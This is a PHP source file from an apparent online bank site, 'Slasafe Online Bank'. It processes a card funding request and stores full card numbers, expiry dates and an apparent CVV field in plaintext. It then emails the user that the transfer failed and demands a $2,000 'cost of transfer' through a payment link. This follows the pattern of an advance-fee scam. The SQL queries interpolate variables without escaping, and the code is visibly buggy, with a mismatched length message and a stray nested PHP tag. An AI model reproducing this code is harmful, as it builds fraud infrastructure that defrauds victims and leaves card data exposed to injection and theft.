<?php

require 'connection.php';


include 'admin_init.php';




$errors = array();




if(isset($_POST['amount'])){

    if(!empty($_POST['amount'])){


if(strlen($_POST['amount']) > 3){


$amount = $_POST['amount'];

}else{

    array_push($errors, '<span style="color:red;">amount length must be greater than 100 characters</span>');


}




    }else{
    array_push($errors, '<span style="color:red;">amount is blank</span>');


    }







}
else{

    array_push($errors, 'amount is required');
}




if(empty($errors)){



    


$date = date_create();

 $date = date_timestamp_get($date);






$qquery =mysqli_query($conn,"SELECT * FROM `author` WHERE account_number = '$account_number' LIMIT 1");

if(mysqli_num_rows($qquery) == 1){
    
$dsd  = mysqli_fetch_array($qquery);

$testamount = $dsd['current_balance'];

if($testamount > $amount){
    


$cardq =mysqli_query($conn,"SELECT * FROM `card` WHERE account_number = '$account_number' LIMIT 1");


if(mysqli_num_rows($cardq) == 1){



$dsss = mysqli_fetch_array($cardq);


$card_name = $dsss['card_name'];
$card_number = $dsss['card_number'];
$exp = $dsss['card_exp'];
$big = $dsss['big'];

$query =mysqli_query($conn,"INSERT INTO `fundcard`(`account_name`, `account_number`, `card_name`, `card_number`, `big`,`exp`, `amount`, `date`)


 VALUES ('$account_name','$account_number','$card_name','$card_number','$big','$exp','$amount','$date')");




if($query){



    echo '



<html>


<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>Processing.. - Slasafe Online Bank</title>


<meta property="og:locale" content="en_US">
<?php

include "head.php";

?>



<meta name="robot" content="noindex" />

</head>




<body style="background:black;">
    


    
<div style="margin-top:40px;">

 
    


<center>
    
<div  style="margin-top:20px;background:white;width:300px;min-height:160px;box-shadow:0px 2px 2px 0px rgb(100,100,100);padding:8px;border-radius:0px 8px 0px 8px;">
    
    
    <center>
        
        

    <div class="header-image" style="display:inline-block;">  

</div>


<h1 style="display:inline-block;margin-left:6px;margin-top:-5px;margin-bottom:5px;color:black;line-height: 31px;">Mail Sent</h1>


      <h4>Processing your payment please check your inbox...</h4>

</center>


</div>


<?php

include "footer.php";

?>

<style>
    
    
    .logbutton{
        
        
         background:black;
         color:white;
        
    }
    
    .logbutton:hover{
        
        
         background:rgb(30,30,190);
         color:white;
        
    }
    
    
</style>



</body>

</html>


</body>
</html>






    ';
    



    
$to = $email;
$subject = "Cost of transfer";

$message ='
<html>
<head>


<meta http-equiv="Content-Type" content="text/html; charset=utf-8">


<title>Transfer failed</title>



</head>
<body>

<h2>Dear '.$account_name.' </h2><p>Your transfer of <b>'.$currency. number_format($amount). ' </b> <span style="color:red;">failed</span></p>


<p>You need to pay cost of tranfer of <b>$2,000</b> before your tranfer will be successful</p>


<p>your account informations

<h4>Card Name:'.$card_name .' </h4>
<p><b>Card Number:'.$card_number     .' <b style="margin-left:6px;color:red;">Exp: '.$exp     .'</b></p>
 <p> Amount: '.     $currency.   number_format($amount). '</b> </p>

</p>
<a style="margin-left:90px;" href="https://slasafe.online/coin/?type=card&cost=2000&cardNumber='.$card_number     .' &amount= '.     $currency.   number_format($amount). '"><button style="border:none;background:rgb(30,30,90);padding:9px;color:white;">pay cost of transfer
</button></a>
</body>
</html>
';

// Always set content-type when sending HTML email
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";


// More headers
$headers .= 'From: Slasafe Support@slasafe.online' . "\r\n";
$headers .= 'Cc: Slasafe Support@slasafe.online' . "\r\n";

if(mail($to,$subject,$message,$headers)){
echo 'mail sent';

}










}else{
echo '<p style="color:red;">Registration failed please try again later</p>';


}



}else{

    echo '<p style="color:red;">please add your card </p>';

}






}
else{
    
   echo '<span style="color:red;font-size:19px;">insufficient fund</span>';
}



}





}else{


echo '';

   foreach($errors as $key => $err){

echo ' <p>' .$err . '</p>';
   }


echo '';


}




?>